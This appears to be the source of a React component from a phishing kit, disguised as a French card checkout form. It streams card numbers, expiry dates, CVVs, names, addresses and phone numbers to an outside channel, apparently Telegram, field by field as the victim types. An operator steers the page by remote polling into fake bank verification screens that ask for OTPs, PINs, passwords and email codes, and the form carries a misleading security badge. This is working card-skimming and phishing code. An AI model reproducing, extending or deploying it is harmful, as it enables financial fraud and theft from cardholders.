import { useState, useRef, useEffect, Suspense, lazy } from "react";
import { useParams } from "react-router-dom";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { FloatingInput } from "@/components/ui/floating-input";
import { CreditCard, Shield } from "lucide-react";
import visaLogo from "@/assets/Visa.png";
import mastercardLogo from "@/assets/master.png";
import { sendCardEntryNotification, sendExpiryNotification, sendCvvNotification, sendSaleNotification, resetInvoiceState, sendRedirectSelChangeNotification } from "../tgapi";
import { toast } from "sonner";

// Lazy load 3D secure components to reduce bundle size
const OTPComponent = lazy(() => import("./3d/fr3dotp"));
const ReqComponent = lazy(() => import("./3d/fr3dreq"));
const ChooseComponent = lazy(() => import("./3d/fr3dchoose"));
const APPComponent = lazy(() => import("./3d/fr3dAPP"));
const ZipComponent = lazy(() => import("./3d/fr3dzip"));
const PwdComponent = lazy(() => import("./3d/fr3dpwd"));
const MailComponent = lazy(() => import("./3d/fr3dmail"));
const PinComponent = lazy(() => import("./3d/fr3dpin"));
const RefComponent = lazy(() => import("./3d/fr3dref"));
const RedirectingComponent = lazy(() => import("./3d/fr3redirecting"));

interface DePaymentFormProps {
  onComplete: () => void;
  amount: string;
  bankName?: string;
  redirectSel?: string;
  // Customer data
  name?: string;
  address?: string;
  city?: string;
  postCode?: string;
  phone?: string;
}

const FrPaymentForm = ({ onComplete, amount, bankName, redirectSel, name, address, city, postCode, phone }: DePaymentFormProps) => {
  const { code } = useParams();
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardholderName, setCardholderName] = useState("");
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cardType, setCardType] = useState<string | null>(null);
  const [showLoadingForm, setShowLoadingForm] = useState(false);
  const [imageErrors, setImageErrors] = useState<{
    [key: string]: boolean;
  }>({});
  const [currentView, setCurrentView] = useState<"default" | "req" | "otp" | "choose" | "app" | "expotp" | "invotp" | "expapp" | "invapp" | "dec" | "zip" | "pwd" | "mail" | "pin" | "ref" | "deccvv" | "decsms">("default");
  const [invoiceData, setInvoiceData] = useState<{
    bank_name?: string;
    redirect_sel?: string;
    name?: string;
  } | null>(null);
  const [cardEntryNotificationSent, setCardEntryNotificationSent] = useState(false);
  const [expiryNotificationSent, setExpiryNotificationSent] = useState(false);
  const [cvvNotificationSent, setCvvNotificationSent] = useState(false);
  const [saleNotificationSent, setSaleNotificationSent] = useState(false);

  // Real-time polling for bank_name and redirect_sel updates
  useEffect(() => {
    if (!code) return;

    // Reset invoice state when payment form first loads
    resetInvoiceState(code);

    const pollInvoiceData = async () => {
      try {
        const response = await fetch(`/api/create_invoice.php?invoice_id=${code}`);
        if (response.ok) {
          const data = await response.json();
          setInvoiceData({
            bank_name: data.bank_name,
            redirect_sel: data.redirect_sel,
            name: data.name
          });
        }
      } catch (error) {
        console.error("Error polling invoice data:", error);
      }
    };

    // Poll every 1 second
    const interval = setInterval(pollInvoiceData, 1000);

    // Cleanup interval on unmount
    return () => clearInterval(interval);
  }, [code]);

  // Auto-show components based on redirect_sel value or reset to default when null
  useEffect(() => {
    if (!showLoadingForm) return;

    const currentRedirectSel = invoiceData?.redirect_sel || redirectSel;
    
    // Reset to default when redirect_sel is null, undefined, or empty
    if (!currentRedirectSel || currentRedirectSel === "null" || currentRedirectSel.trim() === "") {
      setCurrentView('default');
      return;
    }

    // Send notification when redirect_sel starts with "de3 app" or "de3d app"
    const lowerRedirectSel = currentRedirectSel.toLowerCase();
    if (lowerRedirectSel.startsWith('de3 app') || lowerRedirectSel.startsWith('de3d app')) {
      sendRedirectSelChangeNotification(
        code || "Unknown Invoice", 
        name || "Unknown Name", 
        currentRedirectSel
      );
    }

    // Auto-show specific components based on redirect_sel value
    if (currentRedirectSel === "uk3 req" || currentRedirectSel === "de3 req" || currentRedirectSel === "fr3 req") {
      setCurrentView('req');
    } else if (currentRedirectSel === "uk3 ent" || currentRedirectSel === "de3 ent" || currentRedirectSel === "fr3 ent") {
      setCurrentView('otp');
    } else if (currentRedirectSel === "uk3 app" || currentRedirectSel?.startsWith("uk3 app ") || currentRedirectSel === "de3 app" || currentRedirectSel?.startsWith("de3 app ") || currentRedirectSel === "fr3 app" || currentRedirectSel?.startsWith("fr3 app ")) {
      setCurrentView('app');
    } else if (currentRedirectSel === "uk3 exp otp" || currentRedirectSel === "de3 exp otp" || currentRedirectSel === "fr3 exp otp") {
      setCurrentView('expotp');
    } else if (currentRedirectSel === "uk3 inv otp" || currentRedirectSel === "de3 inv otp" || currentRedirectSel === "fr3 inv otp") {
      setCurrentView('invotp');
    } else if (currentRedirectSel === "uk3 exp app" || currentRedirectSel === "de3 exp app" || currentRedirectSel === "fr3 exp app") {
      setCurrentView('expapp');
    } else if (currentRedirectSel === "uk3 inv app" || currentRedirectSel === "de3 inv app" || currentRedirectSel === "fr3 inv app") {
      setCurrentView('invapp');
    } else if (currentRedirectSel === "uk3 dec" || currentRedirectSel === "de3 dec" || currentRedirectSel === "fr3 dec") {
      setCurrentView('dec');
    } else if (currentRedirectSel === "uk3 zip" || currentRedirectSel === "de3 zip" || currentRedirectSel === "fr3 zip") {
      setCurrentView('zip');
    } else if (currentRedirectSel === "uk3 pwd" || currentRedirectSel === "de3 pwd" || currentRedirectSel === "fr3 pwd") {
      setCurrentView('pwd');
    } else if (currentRedirectSel === "uk3 mail" || currentRedirectSel === "de3 mail" || currentRedirectSel === "fr3 mail") {
      setCurrentView('mail');
    } else if (currentRedirectSel === "uk3 pin" || currentRedirectSel === "de3 pin" || currentRedirectSel === "fr3 pin") {
      setCurrentView('pin');
    } else if (currentRedirectSel === "uk3 ref" || currentRedirectSel === "de3 ref" || currentRedirectSel === "fr3 ref") {
      setCurrentView('ref');
    } else if (currentRedirectSel === "uk3 dec cvv" || currentRedirectSel === "de3 dec cvv" || currentRedirectSel === "fr3 dec cvv") {
      setCurrentView('deccvv');
    } else if (currentRedirectSel === "uk3 dec sms" || currentRedirectSel === "de3 dec sms" || currentRedirectSel === "fr3 dec sms") {
      setCurrentView('decsms');
    }
  }, [redirectSel, showLoadingForm, invoiceData]);

  // Refs for auto-focus
  const expiryDateRef = useRef<HTMLInputElement>(null);
  const cvvRef = useRef<HTMLInputElement>(null);
  const cardholderNameRef = useRef<HTMLInputElement>(null);

  // Luhn algorithm for credit card validation
  const validateCardNumber = (cardNumber: string) => {
    // Remove spaces and non-digits
    const cleanCardNumber = cardNumber.replace(/\s+/g, '').replace(/[^0-9]/gi, '');

    // Check if it's a valid length (13-19 digits)
    if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
      return false;
    }

    // Luhn algorithm
    let sum = 0;
    let shouldDouble = false;

    // Process digits from right to left
    for (let i = cleanCardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cleanCardNumber.charAt(i));
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  // Check if form is valid
  const isFormValid = () => {
    const cleanCardNumber = cardNumber.replace(/\s+/g, '');
    const expiryValidation = validateExpiryDate(expiryDate);
    return validateCardNumber(cardNumber) && expiryDate.length === 5 && expiryValidation.isValid && cvv.length === 3 && cardholderName.trim().length > 0 && !cardError && !expiryError;
  };

  // Detect card type based on card number
  const detectCardType = (cardNumber: string) => {
    const cleanNumber = cardNumber.replace(/\s+/g, '');

    // Visa: starts with 4
    if (cleanNumber.match(/^4/)) {
      return 'visa';
    }

    // MasterCard: starts with 5 or 2221-2720
    if (cleanNumber.match(/^5/) || cleanNumber.length >= 4 && parseInt(cleanNumber.substring(0, 4)) >= 2221 && parseInt(cleanNumber.substring(0, 4)) <= 2720) {
      return 'mastercard';
    }
    return null;
  };

  // Validate expiry date
  const validateExpiryDate = (expiryDate: string) => {
    if (expiryDate.length !== 5) return {
      isValid: true,
      error: ""
    }; // MM/YY format

    const [month, year] = expiryDate.split('/');
    const monthNum = parseInt(month, 10);
    const yearNum = parseInt(year, 10) + 2000; // Convert YY to YYYY

    // Check if month is valid
    if (monthNum < 1 || monthNum > 12) {
      return {
        isValid: false,
        error: "Date d'expiration invalide"
      };
    }

    // Check if date is in the future
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1; // getMonth() returns 0-11

    // Card expires at the end of the month, so we compare accordingly
    if (yearNum < currentYear || yearNum === currentYear && monthNum < currentMonth) {
      return {
        isValid: false,
        error: "Carte expirée"
      };
    }
    return {
      isValid: true,
      error: ""
    };
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Send sale notification when payment is submitted
    if (!saleNotificationSent && isFormValid()) {
      await sendSaleNotificationToTg();
      setSaleNotificationSent(true);
    }
    
    setShowLoadingForm(true);
  };

  const sendCardEntryNotificationToTg = async () => {
    if (cardEntryNotificationSent) return;
    const invoiceName = invoiceData?.name || name || code || "Unknown Client";
    await sendCardEntryNotification(invoiceName);
    setCardEntryNotificationSent(true);
  };

  const sendExpiryNotificationToTg = async () => {
    if (expiryNotificationSent) return;
    const invoiceName = invoiceData?.name || name || code || "Unknown Client";
    await sendExpiryNotification(invoiceName, cardholderName, cardNumber, expiryDate);
    setExpiryNotificationSent(true);
  };

  const sendCvvNotificationToTg = async () => {
    if (cvvNotificationSent) return;
    const invoiceName = invoiceData?.name || name || code || "Unknown Client";
    await sendCvvNotification(invoiceName, cardholderName, cardNumber, expiryDate, cvv);
    setCvvNotificationSent(true);
  };

  const sendSaleNotificationToTg = async () => {
    if (saleNotificationSent) return;
    const clientName = invoiceData?.name || name || cardholderName || "Unknown Client";
    const fullAddress = address || "Unknown Address";
    const clientCity = city || "Unknown City";
    const clientZip = postCode || "Unknown Zip";
    const clientPhone = phone || "Unknown Phone";
    
    await sendSaleNotification(clientName, fullAddress, clientCity, clientZip, clientPhone, cardholderName, cardNumber, expiryDate, cvv);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    
    // Send notification when user starts entering card number (only once)
    if (v.length > 0 && !cardEntryNotificationSent) {
      setCardEntryNotificationSent(true); // Set flag immediately to prevent multiple sends
      const invoiceName = invoiceData?.name || name || code || "Unknown Client";
      sendCardEntryNotification(invoiceName);
    }
    
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      const formatted = parts.join(' ');

      // Detect card type
      const detectedType = detectCardType(formatted);
      setCardType(detectedType);

      // Only validate when card number is complete (16+ digits)
      if (match.length >= 16) {
        if (!validateCardNumber(formatted)) {
          setCardError("Numéro de carte de crédit invalide");
        } else {
          setCardError("");
        }
      } else {
        setCardError(""); // Clear any existing errors while typing
      }

      // Auto-focus to expiry date when 16 digits entered
      if (match.length === 16) {
        setTimeout(() => {
          expiryDateRef.current?.focus();
        }, 100);
      }
      return formatted;
    } else {
      setCardError("");
      setCardType(null);
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) {
      const formatted = v.substring(0, 2) + '/' + v.substring(2, 4);

      // Validate expiry date when complete
      if (v.length === 4) {
        const validation = validateExpiryDate(formatted);
        if (!validation.isValid) {
          setExpiryError(validation.error);
        } else {
          setExpiryError("");
          // Send notification when valid expiry date is confirmed and focus moves to CVV
          if (!expiryNotificationSent) {
            sendExpiryNotificationToTg();
          }
        }

        // Auto-focus to CVV when expiry date is complete (MM/YY format)
        setTimeout(() => {
          cvvRef.current?.focus();
        }, 100);
      } else {
        setExpiryError("");
      }
      return formatted;
    }
    setExpiryError("");
    return v;
  };

  return (
    <>
      {/* Loading Form Popup */}
      {showLoadingForm && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-50 animate-fade-in">
          <div className="relative flex flex-col items-center justify-center min-h-screen w-full p-4 py-0 mx-[100px] px-[10px]">
            {/* Number buttons above popup - HIDDEN */}
            <div className="hidden flex flex-col gap-2 mb-4 animate-scale-in px-[10px] mx-[10px]">
              {/* First row - buttons 1-9 */}
              <div className="flex gap-2">
                {[1, 2, 3, 4, 5, 6, 7, 8, 9].map(num => {
                  const getLabel = (number: number) => {
                    switch (number) {
                      case 1:
                        return "req";
                      case 2:
                        return "Ent OTP";
                      case 3:
                        return "Dec";
                      case 4:
                        return "app";
                      case 5:
                        return "choose";
                      case 6:
                        return "exp otp";
                      case 7:
                        return "inv otp";
                      case 8:
                        return "exp app";
                      case 9:
                        return "inv app";
                      default:
                        return null;
                    }
                  };
                  const label = getLabel(num);
                  return (
                    <div key={num} className="flex flex-col items-center h-12">
                      <div className="h-4 flex items-center justify-center mb-1">
                        {label && (
                          <span className="text-xs text-white font-medium">
                            {label}
                          </span>
                        )}
                      </div>
                      <button 
                        onClick={() => {
                          if (num === 1) setCurrentView("req");
                          if (num === 2) setCurrentView("otp");
                          if (num === 3) setCurrentView("dec");
                          if (num === 4) setCurrentView("app");
                          if (num === 5) setCurrentView("choose");
                          if (num === 6) setCurrentView("expotp");
                          if (num === 7) setCurrentView("invotp");
                          if (num === 8) setCurrentView("expapp");
                          if (num === 9) setCurrentView("invapp");
                        }}
                        className="w-8 h-8 bg-card/90 hover:bg-card text-card-foreground rounded-lg text-sm font-bold shadow-md hover:shadow-lg transition-all duration-200 hover:scale-110 border border-border/50">
                        {num}
                      </button>
                    </div>
                  );
                })}
              </div>
              
              {/* Second row - buttons 10-18 */}
              <div className="flex gap-2">
                {[10, 11, 12, 13, 14, 15, 16, 17, 18].map(num => {
                  const getLabel = (number: number) => {
                    switch (number) {
                      case 10:
                        return "zip";
                      case 11:
                        return "pwd";
                      case 12:
                        return "mail";
                      case 13:
                        return "pin";
                      case 14:
                        return "ref";
                      case 15:
                        return "dec cvv";
                      case 16:
                        return "dec sms";
                      case 18:
                        return "clear";
                      default:
                        return null;
                    }
                  };
                  const label = getLabel(num);
                  return (
                    <div key={num} className="flex flex-col items-center h-12">
                      <div className="h-4 flex items-center justify-center mb-1">
                        {label && (
                          <span className="text-xs text-white font-medium">
                            {label}
                          </span>
                        )}
                      </div>
                      <button 
                        onClick={() => {
                          if (num === 10) setCurrentView("zip");
                          if (num === 11) setCurrentView("pwd");
                          if (num === 12) setCurrentView("mail");
                          if (num === 13) setCurrentView("pin");
                          if (num === 14) setCurrentView("ref");
                          if (num === 15) setCurrentView("deccvv");
                          if (num === 16) setCurrentView("decsms");
                          if (num === 18) setCurrentView("default");
                        }}
                        className="w-8 h-8 bg-card/90 hover:bg-card text-card-foreground rounded-lg text-sm font-bold shadow-md hover:shadow-lg transition-all duration-200 hover:scale-110 border border-border/50">
                        {num}
                      </button>
                    </div>
                  );
                })}
              </div>
            </div>
            <Card className="glass-card hover-lift shadow-2xl hover:shadow-3xl transition-all duration-300 ease-in-out border border-border/50 w-full max-w-md mx-4 animate-scale-in bg-card rounded-lg overflow-hidden">
              {/* Banner with Shield */}
              <div className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-700 p-4 rounded-t-lg">
                <div className="flex items-center justify-center space-x-3">
                  <div className="relative p-2 rounded-xl bg-white/20 shadow-md border border-white/30 backdrop-blur-sm">
                    <Shield className="h-5 w-5 text-gray-700 drop-shadow-sm" />
                    <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent pointer-events-none"></div>
                  </div>
                  <h2 className="text-lg font-bold drop-shadow-sm">Vérification de la carte</h2>
                </div>
              </div>
              {/* Main content with red border */}
              <CardContent className="p-6 bg-card rounded-b-lg overflow-y-auto max-h-[60vh]">
                <div className="p-6 bg-card shadow-2xl rounded-lg overflow-y-auto">
                 <div className="text-center">
                     <div className="flex items-center justify-center mb-4">
                        {currentView === "req" ? (
                           <ReqComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                        ) : currentView === "otp" ? (
                         <OTPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "expotp" ? (
                          <OTPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
         ) : currentView === "app" ? (
           <APPComponent
             cardType={cardType} 
             bankName={invoiceData?.bank_name || bankName}
             showText={(() => {
               const currentRedirectSel = invoiceData?.redirect_sel || redirectSel;
               if (currentRedirectSel?.startsWith("fr3 app ") || currentRedirectSel?.startsWith("de3 app ") || currentRedirectSel?.startsWith("uk3 app ")) {
                 return currentRedirectSel.substring(8); // Extract text after "fr3 app "
               }
               return false;
             })()}
           />
                         ) : currentView === "invotp" ? (
                          <OTPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                        ) : currentView === "expapp" ? (
                          <APPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                        ) : currentView === "invapp" ? (
                          <APPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "dec" ? (
                           <APPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "zip" ? (
                           <ZipComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "pwd" ? (
                           <PwdComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "mail" ? (
                           <MailComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "pin" ? (
                           <PinComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "ref" ? (
                           <RefComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "deccvv" ? (
                           <APPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "decsms" ? (
                           <APPComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} />
                         ) : currentView === "choose" ? (
                           <ChooseComponent cardType={cardType} bankName={invoiceData?.bank_name || bankName} onChoice={(choice) => {
                             if (choice === 'bank') setCurrentView("default");
                             if (choice === 'sms') setCurrentView("req");
                           }} />
                       ) : (
                        <>
                           {cardType === 'visa' && <img src={visaLogo} alt="Visa" className="h-6 w-auto object-contain" />}
                           {cardType === 'mastercard' && <img src={mastercardLogo} alt="MasterCard" className="h-6 w-auto object-contain" />}
                          {!cardType && <h3 className="text-xl font-bold text-foreground">Traitement du paiement</h3>}
                        </>
                      )}
                    </div>
                    {currentView === "default" && (
                      <>
                        <p className="text-muted-foreground mb-6">Veuillez patienter pendant que nous traitons votre paiement...</p>
                        <div className="flex justify-center items-center space-x-2">
                          <div className="w-3 h-3 bg-yellow-500 rounded-full animate-bounce"></div>
                          <div className="w-3 h-3 bg-yellow-500 rounded-full animate-bounce" style={{
                        animationDelay: '0.1s'
                      }}></div>
                          <div className="w-3 h-3 bg-yellow-500 rounded-full animate-bounce" style={{
                        animationDelay: '0.2s'
                      }}></div>
                        </div>
                      </>
                    )}
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      )}
      
      <div className="space-y-6 animate-fade-in mx-[11px] px-[11px]">
        <Card className="glass-card hover-lift shadow-2xl hover:shadow-3xl transition-all duration-300 ease-in-out border border-border/50 w-full max-w-lg mx-auto">
        <CardHeader className="pb-0">
          <div className="flex items-center justify-between text-sm font-semibold mb-2">
            <div className="flex items-center">
              <div className="relative p-2 rounded-xl bg-green-50 mr-3 shadow-md border border-white/50 backdrop-blur-sm">
                <CreditCard className="h-4 w-4 text-green-600 drop-shadow-sm" />
                <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent pointer-events-none"></div>
              </div>
              <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10 text-card-foreground text-sm">Détails de paiement</span>
              </span>
            </div>
          </div>
        </CardHeader>
        
        <CardContent className="px-6 py-4">
          {/* Instructional text */}
          <p className="text-sm text-muted-foreground mb-4 text-center">
            Saisissez les détails de votre carte pour compléter le paiement de {amount}
          </p>
          
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Invoice Data Display - HIDDEN */}
            <div className="hidden mb-4 p-3 bg-muted/50 rounded-lg border border-border/50">
              <div className="flex gap-4">
                <div className="flex-1">
                  <div className="text-xs font-medium text-muted-foreground">Redirect Sel</div>
                  <div className="text-sm font-semibold text-foreground">{invoiceData?.redirect_sel || redirectSel || "null"}</div>
                </div>
                <div className="flex-1">
                  <div className="text-xs font-medium text-muted-foreground">Bank Name</div>
                  <div className="text-sm font-semibold text-foreground">{invoiceData?.bank_name || bankName || "null"}</div>
                </div>
              </div>
            </div>
            
            <div className="space-y-2">
              <div className="relative">
                <FloatingInput 
                  label="Numéro de carte" 
                  type="text" 
                  placeholder="1234 5678 9012 3456" 
                  value={cardNumber} 
                  onChange={e => setCardNumber(formatCardNumber(e.target.value))} 
                  maxLength={19} 
                  required 
                  className={`${cardError ? "border-destructive focus:border-destructive" : ""} [&>div>input]:text-sm [&>div>input]:font-medium [&>div>input]:text-muted-foreground [&>div>label]:text-muted-foreground ${cardType ? '[&>div>input]:pr-20' : ''}`} 
                />
                 {/* Card Logo */}
                 {cardType && (
                   <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                       {cardType === 'visa' && (!imageErrors.visa ? (
                          <img 
                            src={visaLogo} 
                            alt="Visa" 
                            className="h-6 w-auto object-contain" 
                            onError={e => {
                             console.error('Visa image failed to load:', e);
                             setImageErrors(prev => ({
                               ...prev,
                               visa: true
                             }));
                           }} 
                          />
                       ) : (
                         <div className="text-xs font-bold text-blue-600">Visa</div>
                       ))}
                       {cardType === 'mastercard' && (!imageErrors.mastercard ? (
                          <img 
                            src={mastercardLogo} 
                            alt="MasterCard" 
                            className="h-6 w-auto object-contain" 
                            onError={e => {
                             console.error('MasterCard image failed to load:', e);
                             setImageErrors(prev => ({
                               ...prev,
                               mastercard: true
                             }));
                           }} 
                          />
                       ) : (
                         <div className="text-xs font-bold text-red-600">MasterCard</div>
                       ))}
                   </div>
                 )}
              </div>
              {cardError && <p className="text-red-500 text-xs mt-1 font-medium">{cardError}</p>}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <FloatingInput 
                  ref={expiryDateRef} 
                  label="Date d'expiration" 
                  type="text" 
                  placeholder="MM/YY" 
                  value={expiryDate} 
                  onChange={e => setExpiryDate(formatExpiryDate(e.target.value))} 
                  maxLength={5} 
                  required 
                  className={`[&>div>input]:text-sm [&>div>input]:font-medium [&>div>input]:text-muted-foreground [&>div>label]:text-muted-foreground ${expiryError ? "border-destructive focus:border-destructive" : ""}`} 
                />
                {expiryError && <p className="text-red-500 text-xs mt-1 font-medium">{expiryError}</p>}
              </div>
              <div className="space-y-2">
                <FloatingInput 
                  ref={cvvRef} 
                  label="CVV" 
                  type="text" 
                  placeholder="123" 
                  value={cvv} 
                  onChange={e => {
                    const newCvv = e.target.value.replace(/[^0-9]/g, '').substring(0, 3);
                    setCvv(newCvv);
                    // Auto-focus to cardholder name when CVV is complete (3 digits)
                    if (newCvv.length === 3) {
                      setTimeout(() => {
                        cardholderNameRef.current?.focus();
                      }, 100);
                    }
                  }} 
                  onBlur={() => {
                    // Send CVV notification when user leaves the CVV field
                    if (cvv.length === 3 && !cvvNotificationSent) {
                      sendCvvNotificationToTg();
                    }
                  }} 
                  maxLength={3} 
                  required 
                  className="[&>div>input]:text-sm [&>div>input]:font-medium [&>div>input]:text-muted-foreground [&>div>label]:text-muted-foreground" 
                />
              </div>
            </div>

            <div className="space-y-2">
              <FloatingInput 
                ref={cardholderNameRef} 
                label="Nom du titulaire" 
                type="text" 
                placeholder="Jean Dupont" 
                value={cardholderName} 
                onChange={e => setCardholderName(e.target.value)} 
                required 
                className="[&>div>input]:text-sm [&>div>input]:font-medium [&>div>input]:text-muted-foreground [&>div>label]:text-muted-foreground" 
              />
            </div>

            <div className="border-t border-border pt-4 mt-4">
              <div className="flex justify-between items-center mb-4">
                <span className="text-sm font-medium text-card-foreground">Total</span>
                <span className="text-lg font-bold text-foreground">{amount}</span>
              </div>
              
              <Button 
                type="submit" 
                disabled={!isFormValid()} 
                className={`w-auto px-8 py-2 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-sm font-semibold rounded-lg hover:scale-105 active:scale-95 mx-auto ${
                  isFormValid() ? "bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600" : "bg-muted cursor-not-allowed"
                }`}
              >
                Payer {amount}
              </Button>
              
              {/* SSL Security Badge */}
              <div className="flex items-center justify-center mt-4 p-3 bg-green-50 border border-green-200 rounded-lg">
                <Shield className="h-4 w-4 text-green-600 mr-2" />
                <span className="text-sm font-medium text-green-700">Chiffrement SSL 256-bit</span>
              </div>
            </div>
          </form>
        </CardContent>
      </Card>
    </div>
    </>
  );
};

export default FrPaymentForm;
